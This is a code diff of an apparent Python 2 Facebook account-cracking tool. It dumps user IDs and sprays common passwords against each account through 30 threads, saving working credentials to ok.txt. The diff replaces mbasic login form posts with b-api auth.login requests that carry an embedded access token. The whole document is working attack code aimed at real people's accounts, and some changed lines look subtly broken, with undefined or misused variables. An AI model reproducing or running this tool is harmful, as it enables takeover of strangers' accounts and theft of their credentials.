@@ -359,38 +359,8 @@ def dump_likers():
         except OSError:
                 exit("   [!] Dump Failed")
 
-def crack():
-    os.system('clear')
-    print logo
-    print("   [ Choose Methode Crack ]\n")
-    print("   [1] Crack With Api")
-    print("   [2] Crack With Mbasic")
-    print("   [3] Crack With Touch Facebook")
-    print("   [4] Crack With M.Facebook")
-    print("   [5] Back")
-    choose_crack()
-
-def choose_crack():
-    cra = raw_input("\n   [•] Choose : ")
-    if cra=="":
-        print("   [!] Fill In The Correct")
-        crack()
-    elif cra=="1":
-        crack_mbasic()
-    elif cra=="2":
-        crack_mbasic()
-    elif cra=="3":
-        crack_mbasic()
-    elif cra=="4":
-        crack_mbasic()
-    elif cra=="5":
-        options()
-    else:
-        print("   [!] Fill In The Correct")
-        crack()
-
 # CRACK API
-def crack_mbasic():
+def crack():
         os.system('clear')
         print logo
 	global toket
@@ -420,11 +390,11 @@ def crack_mbasic():
         except:
                 pass
         m=ThreadPool(30)
-        m.map(crack1_mbasic,target)
+        m.map(crack1,target)
         results(Successful,Checkpoint)
         exit()
 
-def crack1_mbasic(user):
+def crack1(user):
 	global loop
 	try:
 		a = s.get(api.format('%s?access_token=%s' % (user, toket)), headers=hea).json()
@@ -432,16 +402,16 @@ def crack1_mbasic(user):
 		bk = a['last_name'].lower()
 		tl = a['birthday']
 		for pw in [dp+'123',dp+'12345','sayang','bismillah','123456','anjing']:
-			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
-			xo = rex.content
-			if 'mbasic_logout_button' in xo or 'save-device' in xo:
+			URL = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+str(i)+"&locale=en_US&password="+str(pw)+"&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS"
+                        w = s.get(URL,headers=hea).json()
+			if 'access_token' in w:
 				print '\r\x1b[0;32m   [OK] ' +user+ ' | ' +pw+ ' | ' +tl+ '                    '
 				Successful.append(user+' | '+pw+' | '+tl)
 				save = open('ok.txt','a')
 				save.write(str(user)+' | '+str(pw)+'\n')
 				save.close()
 				break
-			elif 'checkpoint' in xo:
+			elif 'www.facebook.com' in w['error_msg']:
 				print '\r\x1b[0;33m   [CP] ' +user+ ' | ' +pw+ ' | ' +tl+ '                    '
 				Checkpoint.append(user+' | '+pw+' | '+tl)
 				save = open('cp.txt','a')
@@ -482,16 +452,16 @@ def cs(user):
 	global loop,pw
 	try:	
 		for i in pw:
-			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': i, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
-			xo = rex.content
-			if 'mbasic_logout_button' in xo or 'save-device' in xo:
+			URL = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+str(i)+"&locale=en_US&password="+str(pw)+"&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS"
+                        w = s.get(URL,headers=hea).json()
+			if 'access_token' in w:
 				print "\r   [OK]  %s | %s %s              "%(user,i,I)
 				Successful.append(user+' | '+i)
 				save = open('ok.txt','a')
 				save.write(str(user)+' | '+str(i)+'\n')
 				save.close()
 				break
-			elif 'checkpoint' in xo:
+			elif 'www.facebook.com' in w['error_msg']:
 				print "\r   [CP]  %s | %s %s              "%(user,i,I)
 				Checkpoint.append(user+' | '+i)
 				save = open('cp.txt','a')
